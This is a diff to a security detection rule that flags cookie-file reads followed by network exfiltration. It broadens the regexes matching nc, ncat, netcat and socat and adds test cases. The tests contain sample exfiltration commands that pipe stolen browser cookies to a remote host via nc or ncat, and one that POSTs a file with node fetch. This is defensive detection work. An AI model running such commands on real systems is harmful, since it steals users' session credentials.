@@ -33,8 +33,8 @@ correlation:
           e.command.command.matches("(?i)\\bcurl\\s") ||
           e.command.command.matches("(?i)\\b(curl|wget)\\b[^\\n]*https?://") ||
           e.command.command.matches("(?i)\\bwget\\s") ||
-          e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?([\\w.~-]*/)?(nc|ncat|netcat|socat)\\s+\\S") ||
-          e.command.command.matches("(?i)(^|[\\s/;&|(`])(nc|ncat|netcat|socat)\\s+-[a-z]") ||
+          e.command.command.matches("(?i)(^|[;&|(`'\"]|\\$\\()\\s*((sudo|doas|nohup|exec|env|command|nice|time)\\s+|timeout\\s+\\S+\\s+)*([^\\s;&|'\"]*/)?(nc|ncat|netcat|socat)\\s+\\S") ||
+          e.command.command.matches("(?i)\\b(nc|ncat|netcat|socat)\\s+-") ||
           e.command.command.matches("/dev/(tcp|udp)/") ||
           e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(scp|sftp|rsync)\\s([^;&|\\n]*\\s)?[\\w.@-]+:") ||
           e.command.command.matches("(?i)\\b(python[0-9.]*|node|deno|bun|ruby|perl|php)\\s+(-c|-e|-r)\\s[\\s\\S]*(requests\\.(post|put|get|patch|request)\\(|urllib\\.request|urlopen\\(|http\\.client\\.|socket\\.create_connection\\(|\\.connect\\(\\(|fetch\\(|https?\\.(request|get)\\(|net::http\\.(get|post|start)|lwp::|fsockopen\\()") ||
@@ -167,4 +167,48 @@ tests:
       - timestamp: "2026-06-13T10:00:30Z"
         event: { action: command.executed }
         command: { command: "node -e \"\nconst b = require('fs').readFileSync('/tmp/c');\nfetch('https://drop.example', { method: 'POST', body: b });\n\"" }
+        session: { id: s1 }
+  - name: cookies_then_wrapped_flagless_nc
+    verdict: match
+    events:
+      - timestamp: "2026-06-13T10:00:00Z"
+        event: { action: file.read }
+        file: { path: "/home/u/.mozilla/firefox/abc.default/cookies.sqlite" }
+        session: { id: s1 }
+      - timestamp: "2026-06-13T10:00:10Z"
+        event: { action: command.executed }
+        command: { command: "timeout 5 nc 203.0.113.9 4444 < /tmp/c" }
+        session: { id: s1 }
+  - name: cookies_then_nohup_flagless_ncat
+    verdict: match
+    events:
+      - timestamp: "2026-06-13T10:00:00Z"
+        event: { action: file.read }
+        file: { path: "/home/u/.mozilla/firefox/abc.default/cookies.sqlite" }
+        session: { id: s1 }
+      - timestamp: "2026-06-13T10:00:10Z"
+        event: { action: command.executed }
+        command: { command: "nohup ncat host 443 < /tmp/c" }
+        session: { id: s1 }
+  - name: cookies_then_absolute_path_flagless_nc
+    verdict: match
+    events:
+      - timestamp: "2026-06-13T10:00:00Z"
+        event: { action: file.read }
+        file: { path: "/home/u/.mozilla/firefox/abc.default/cookies.sqlite" }
+        session: { id: s1 }
+      - timestamp: "2026-06-13T10:00:10Z"
+        event: { action: command.executed }
+        command: { command: "/usr/bin/nc 203.0.113.9 4444 < /tmp/c" }
+        session: { id: s1 }
+  - name: cookies_then_absolute_path_ncat_long_flag
+    verdict: match
+    events:
+      - timestamp: "2026-06-13T10:00:00Z"
+        event: { action: file.read }
+        file: { path: "/home/u/.mozilla/firefox/abc.default/cookies.sqlite" }
+        session: { id: s1 }
+      - timestamp: "2026-06-13T10:00:10Z"
+        event: { action: command.executed }
+        command: { command: "/usr/bin/ncat --ssl host 443" }
         session: { id: s1 }
